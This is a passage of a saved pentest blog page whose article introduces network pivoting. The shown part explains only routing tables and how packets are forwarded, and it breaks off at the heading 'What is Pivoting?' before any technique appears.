<html class="no-js" lang="en-US"><!--<![endif]--><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="">
<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js" nonce="c43279e9-85c4-4d78-bb1a-afc1a6485ddd"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-4N3GY152W8&amp;l=dataLayer&amp;cx=c" nonce="c43279e9-85c4-4d78-bb1a-afc1a6485ddd"></script><script defer="" referrerpolicy="origin" src="/cdn-cgi/zaraz/s.js?z=JTdCJTIyZXhlY3V0ZWQlMjIlM0ElNUIlNUQlMkMlMjJ0JTIyJTNBJTIyRXhwbG9yZSUyMEhpZGRlbiUyME5ldHdvcmtzJTIwV2l0aCUyMERvdWJsZSUyMFBpdm90aW5nJTIwJUUyJTgwJTkzJTIwUGVudGVzdCUyMEJsb2clMjIlMkMlMjJ4JTIyJTNBMC4zMzI4NTc5MjI4Nzk1MDMyJTJDJTIydyUyMiUzQTE1MzYlMkMlMjJoJTIyJTNBODY0JTJDJTIyaiUyMiUzQTY5MiUyQyUyMmUlMjIlM0ExMjgwJTJDJTIybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGcGVudGVzdC5ibG9nJTJGZXhwbG9yZS1oaWRkZW4tbmV0d29ya3Mtd2l0aC1kb3VibGUtcGl2b3RpbmclMkYlMjIlMkMlMjJyJTIyJTNBJTIyJTIyJTJDJTIyayUyMiUzQTI0JTJDJTIybiUyMiUzQSUyMlVURi04JTIyJTJDJTIybyUyMiUzQS0xMjAlMkMlMjJxJTIyJTNBJTVCJTdCJTIybSUyMiUzQSUyMnNldCUyMiUyQyUyMmElMjIlM0ElNUIlMjIwJTIyJTJDJTIyVSUyMiUyQyU3QiUyMnNjb3BlJTIyJTNBJTIycGFnZSUyMiU3RCU1RCU3RCUyQyU3QiUyMm0lMjIlM0ElMjJzZXQlMjIlMkMlMjJhJTIyJTNBJTVCJTIyMSUyMiUyQyUyMkElMjIlMkMlN0IlMjJzY29wZSUyMiUzQSUyMnBhZ2UlMjIlN0QlNUQlN0QlMkMlN0IlMjJtJTIyJTNBJTIyc2V0JTIyJTJDJTIyYSUyMiUzQSU1QiUyMjIlMjIlMkMlMjItJTIyJTJDJTdCJTIyc2NvcGUlMjIlM0ElMjJwYWdlJTIyJTdEJTVEJTdEJTJDJTdCJTIybSUyMiUzQSUyMnNldCUyMiUyQyUyMmElMjIlM0ElNUIlMjIzJTIyJTJDJTIyOCUyMiUyQyU3QiUyMnNjb3BlJTIyJTNBJTIycGFnZSUyMiU3RCU1RCU3RCUyQyU3QiUyMm0lMjIlM0ElMjJzZXQlMjIlMkMlMjJhJTIyJTNBJTVCJTIyNCUyMiUyQyUyMjglMjIlMkMlN0IlMjJzY29wZSUyMiUzQSUyMnBhZ2UlMjIlN0QlNUQlN0QlMkMlN0IlMjJtJTIyJTNBJTIyc2V0JTIyJTJDJTIyYSUyMiUzQSU1QiUyMjUlMjIlMkMlMjIxJTIyJTJDJTdCJTIyc2NvcGUlMjIlM0ElMjJwYWdlJTIyJTdEJTVEJTdEJTJDJTdCJTIybSUyMiUzQSUyMnNldCUyMiUyQyUyMmElMjIlM0ElNUIlMjI2JTIyJTJDJTIyMCUyMiUyQyU3QiUyMnNjb3BlJTIyJTNBJTIycGFnZSUyMiU3RCU1RCU3RCUyQyU3QiUyMm0lMjIlM0ElMjJzZXQlMjIlMkMlMjJhJTIyJTNBJTVCJTIyNyUyMiUyQyUyMjAlMjIlMkMlN0IlMjJzY29wZSUyMiUzQSUyMnBhZ2UlMjIlN0QlNUQlN0QlMkMlN0IlMjJtJTIyJTNBJTIyc2V0JTIyJTJDJTIyYSUyMiUzQSU1QiUyMjglMjIlMkMlMjI5JTIyJTJDJTdCJTIyc2NvcGUlMjIlM0ElMjJwYWdlJTIyJTdEJTVEJTdEJTJDJTdCJTIybSUyMiUzQSUyMnNldCUyMiUyQyUyMmElMjIlM0ElNUIlMjI5JTIyJTJDJTIyMiUyMiUyQyU3QiUyMnNjb3BlJTIyJTNBJTIycGFnZSUyMiU3RCU1RCU3RCUyQyU3QiUyMm0lMjIlM0ElMjJzZXQlMjIlMkMlMjJhJTIyJTNBJTVCJTIyMTAlMjIlMkMlMjIzJTIyJTJDJTdCJTIyc2NvcGUlMjIlM0ElMjJwYWdlJTIyJTdEJTVEJTdEJTJDJTdCJTIybSUyMiUzQSUyMnNldCUyMiUyQyUyMmElMjIlM0ElNUIlMjIxMSUyMiUyQyUyMi0lMjIlMkMlN0IlMjJzY29wZSUyMiUzQSUyMnBhZ2UlMjIlN0QlNUQlN0QlMkMlN0IlMjJtJTIyJTNBJTIyc2V0JTIyJTJDJTIyYSUyMiUzQSU1QiUyMjEyJTIyJTJDJTIyMSUyMiUyQyU3QiUyMnNjb3BlJTIyJTNBJTIycGFnZSUyMiU3RCU1RCU3RCU1RCU3RA=="></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=UA-88100923-1&amp;l=dataLayer&amp;cx=c" nonce="c43279e9-85c4-4d78-bb1a-afc1a6485ddd"></script><script async="" src="https://www.google-analytics.com/analytics.js"></script><script src="/cdn-cgi/apps/head/GAmp0nPfko6DhqV59r5hk7a5kDM.js"></script><link rel="profile" href="http://gmpg.org/xfn/11">
<title>Explore Hidden Networks With Double Pivoting – Pentest Blog</title>
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Feed" href="https://pentest.blog/feed/">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Comments Feed" href="https://pentest.blog/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Explore Hidden Networks With Double Pivoting Comments Feed" href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/feed/">
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentest.blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.3"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://pentest.blog/wp-includes/css/dist/block-library/style.min.css?ver=6.5.3" type="text/css" media="all">
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="asciinema-player-css-css" href="https://pentest.blog/wp-content/plugins/asciiplayer/asciinema-player.css?ver=2.4.1" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-bootstrap-css" href="https://pentest.blog/wp-content/themes/sparkling/assets/css/bootstrap.min.css?ver=6.5.3" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-icons-css" href="https://pentest.blog/wp-content/themes/sparkling/assets/css/fontawesome-all.min.css?ver=5.1.1." type="text/css" media="all">
<link rel="stylesheet" id="sparkling-fonts-css" href="//fonts.googleapis.com/css?family=Open+Sans%3A400italic%2C400%2C600%2C700%7CRoboto+Slab%3A400%2C300%2C700&amp;ver=6.5.3" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-style-css" href="https://pentest.blog/wp-content/themes/sparkling/style.css?ver=2.4.2" type="text/css" media="all">
<link rel="stylesheet" id="enlighterjs-css" href="https://pentest.blog/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=vLiMInY5I09xi1g" type="text/css" media="all">
<script type="text/javascript" src="https://pentest.blog/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://pentest.blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://pentest.blog/wp-content/themes/sparkling/assets/js/vendor/bootstrap.min.js?ver=6.5.3" id="sparkling-bootstrapjs-js"></script>
<script type="text/javascript" src="https://pentest.blog/wp-content/themes/sparkling/assets/js/functions.js?ver=20180503" id="sparkling-functions-js"></script>

<script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=GT-MK4L4F6" id="google_gtagjs-js" async=""></script>
<script type="text/javascript" id="google_gtagjs-js-after">
/* <![CDATA[ */
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag('set', 'linker', {"domains":["pentest.blog"]} );
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "GT-MK4L4F6");
/* ]]> */
</script>

<link rel="https://api.w.org/" href="https://pentest.blog/wp-json/"><link rel="alternate" type="application/json" href="https://pentest.blog/wp-json/wp/v2/posts/462"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pentest.blog/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.5.3">
<link rel="canonical" href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">
<link rel="shortlink" href="https://pentest.blog/?p=462">
<link rel="alternate" type="application/json+oembed" href="https://pentest.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentest.blog%2Fexplore-hidden-networks-with-double-pivoting%2F">
<meta name="generator" content="Site Kit by Google 1.119.0"><style type="text/css">.entry-content {font-family: Tahoma, Geneva;}.entry-content {font-size:15px}</style><style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style> <style type="text/css">
				.navbar > .container .navbar-brand {
			color: #dadada;
		}
		</style>
<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="32x32">
<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png">
<meta name="msapplication-TileImage" content="https://pentest.blog/wp-content/uploads/logo-favicon.png">
<style type="text/css" id="wp-custom-css">
			#secondary .widget a {
    color: #636467;
}		</style>
<script nonce="c43279e9-85c4-4d78-bb1a-afc1a6485ddd">try{(function(w,d){!function(j,k,l,m){j[l]=j[l]||{};j[l].executed=[];j.zaraz={deferred:[],listeners:[]};j.zaraz._v="5671";j.zaraz.q=[];j.zaraz._f=function(n){return async function(){var o=Array.prototype.slice.call(arguments);j.zaraz.q.push({m:n,a:o})}};for(const p of["track","set","debug"])j.zaraz[p]=j.zaraz._f(p);j.zaraz.init=()=>{var q=k.getElementsByTagName(m)[0],r=k.createElement(m),s=k.getElementsByTagName("title")[0];s&&(j[l].t=k.getElementsByTagName("title")[0].text);j[l].x=Math.random();j[l].w=j.screen.width;j[l].h=j.screen.height;j[l].j=j.innerHeight;j[l].e=j.innerWidth;j[l].l=j.location.href;j[l].r=k.referrer;j[l].k=j.screen.colorDepth;j[l].n=k.characterSet;j[l].o=(new Date).getTimezoneOffset();if(j.dataLayer)for(const w of Object.entries(Object.entries(dataLayer).reduce(((x,y)=>({...x[1],...y[1]})),{})))zaraz.set(w[0],w[1],{scope:"page"});j[l].q=[];for(;j.zaraz.q.length;){const z=j.zaraz.q.shift();j[l].q.push(z)}r.defer=!0;for(const A of[localStorage,sessionStorage])Object.keys(A||{}).filter((C=>C.startsWith("_zaraz_"))).forEach((B=>{try{j[l]["z_"+B.slice(7)]=JSON.parse(A.getItem(B))}catch{j[l]["z_"+B.slice(7)]=A.getItem(B)}}));r.referrerPolicy="origin";r.src="/cdn-cgi/zaraz/s.js?z="+btoa(encodeURIComponent(JSON.stringify(j[l])));q.parentNode.insertBefore(r,q)};["complete","interactive"].includes(k.readyState)?zaraz.init():j.addEventListener("DOMContentLoaded",zaraz.init)}(w,d,"zarazData","script");})(window,document)}catch(e){throw fetch("/cdn-cgi/zaraz/t"),e;};</script><script async="" type="text/javascript" src="https://pentestblog.disqus.com/count.js"></script><script type="text/javascript" async="" src="https://pentestblog.disqus.com/embed.js"></script></head>
<body class="post-template-default single single-post postid-462 single-format-standard group-blog">
<a class="sr-only sr-only-focusable" href="#content">Skip to main content</a>
<div id="page" class="hfeed site">
<header id="masthead" class="site-header" role="banner">
<nav class="navbar navbar-default
		" role="navigation">
<div class="container">
<div class="row">
<div class="site-navigation-inner col-sm-12">
<div class="navbar-header">
<div id="logo">
<a href="https://pentest.blog/"><img src="https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png" height="67" width="280" alt="Pentest Blog"></a>
</div>
<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
</div>
<div class="collapse navbar-collapse navbar-ex1-collapse"><ul id="menu-header-menu" class="nav navbar-nav"><li id="menu-item-1061" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1061"><a href="https://pentest.blog/category/advisories/">Advisories</a></li>
<li id="menu-item-105" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105"><a href="https://pentest.blog/category/operating-system/">Operating System</a></li>
<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="https://pentest.blog/category/application-security/">Application Security</a></li>
<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-11"><a href="https://pentest.blog/category/network/">Network</a></li>
<li id="menu-item-106" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-106"><a href="https://pentest.blog/category/tools/">Tools</a></li>
<li id="menu-item-991" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-991"><a href="https://pentest.blog/article-series/">Article Series</a></li>
<li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14"><a href="https://pentest.blog/about-us/">About Us</a></li>
</ul></div>
</div>
</div>
</div>
</nav>
</header>
<div id="content" class="site-content">
<div class="top-section">
</div>
<div class="container main-content-area">
<div class="row side-pull-left">
<div class="main-content-inner col-sm-12 col-md-8">
<div id="primary" class="content-area">
<main id="main" class="site-main" role="main">
<article id="post-462" class="post-462 post type-post status-publish format-standard has-post-thumbnail hentry category-network tag-metasploit tag-pivoting tag-routing tag-windows">
<img width="750" height="410" src="https://pentest.blog/wp-content/uploads/double-pivot-750x410.jpg" class="single-featured wp-post-image" alt="" decoding="async" fetchpriority="high"> <div class="post-inner-content">
<header class="entry-header page-header">
<h1 class="entry-title ">Explore Hidden Networks With Double Pivoting</h1>
<div class="entry-meta">
<span class="posted-on"><i class="fa fa-calendar-alt"></i> <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/" rel="bookmark"><time class="entry-date published" datetime="2016-12-31T12:33:22+03:00">December 31, 2016</time><time class="updated" datetime="2017-01-03T20:47:00+03:00">January 3, 2017</time></a></span><span class="byline"> <i class="fa fa-user"></i> <span class="author vcard"><a class="url fn n" href="https://pentest.blog/author/mucahit-karadag/">Mucahit Karadag</a></span></span>
<span class="cat-links"><i class="fa fa-folder-open"></i>
<a href="https://pentest.blog/category/network/" rel="category tag">Network</a> </span>
</div>
</header>
<div class="entry-content">
<p>An n-layered security architecture is created to protect important services required by the concept of <strong>Defense-in-Depth</strong>, which has an important place in the world of information technology. &nbsp;If we think about this for the corporate networks; critical systems &nbsp;<strong>can not be</strong> in the same network with other systems.&nbsp;In this article, we will analyze with examples how the attackers can access the hidden networks that have no accessibility in the first stage, by using pivoting methods.<span id="more-462"></span></p>
<h3>What is Routing&nbsp;?</h3>
<p>The process of determining how devices in different networks communicate with each other is called <strong>routing</strong>. Routing is usually performed with devices called “routers”. The routers, routes the&nbsp;network&nbsp;packages to the respective destinations by using the routing&nbsp;table.&nbsp;Routing can be done not only with network devices, such as routers, but also with any computer that has the operating system installed on it.</p>
<p><img decoding="async" class="aligncenter size-full wp-image-520" src="https://pentest.blog/wp-content/uploads/1.png" alt="" width="785" height="364" srcset="https://pentest.blog/wp-content/uploads/1.png 785w, https://pentest.blog/wp-content/uploads/1-300x139.png 300w, https://pentest.blog/wp-content/uploads/1-768x356.png 768w" sizes="(max-width: 785px) 100vw, 785px"></p>
<p>According to the example in the above figure, &nbsp;inorder to successfully communicate between <strong>192.168.1.0/24</strong> and <strong>192.168.10.0/24</strong> networks requires a routing table record. According to the rule defined in the router, access is made from “192.168.1.0/24 source to 192.168.10.0/24 destination”.</p>
<p>Adventure of a network package is as follow:</p>
<ol>
<li>Is the IP address to be accessed on the local network?
<ul>
<li>If so, reach the destination.</li>
<li>If not, send it to the gateway.</li>
</ul>
</li>
<li>Once the router receives the package, it looks at its own routing table
<ul>
<li>Do I have a&nbsp;routing rule for the destination IP address or the destination network?
<ul>
<li>If yes, route the package to the destination.</li>
<li>If not, send to gateway.</li>
</ul>
</li>
</ul>
</li>
<li>The same process is repeated in other routers.</li>
<li>The package finally arrives to&nbsp;the router responsible for the internet exit of the institution.&nbsp;And the package is sent to the internet</li>
</ol>
<h3>What is Pivoting&nbsp;?</h3>
<figure class="thumbnail wp-caption aligncenter" style="width: 338px"><img decoding="async" src="https://media.giphy.com/media/pQ9mgqSSOER2g/giphy.gif" alt="A rabbit hole from Alice in Wonderland" width="328" height="257"><figcaption class="caption wp-caption-text"><em>A rabbit hole from Alice in Wonderland</em></figcaption></figure>
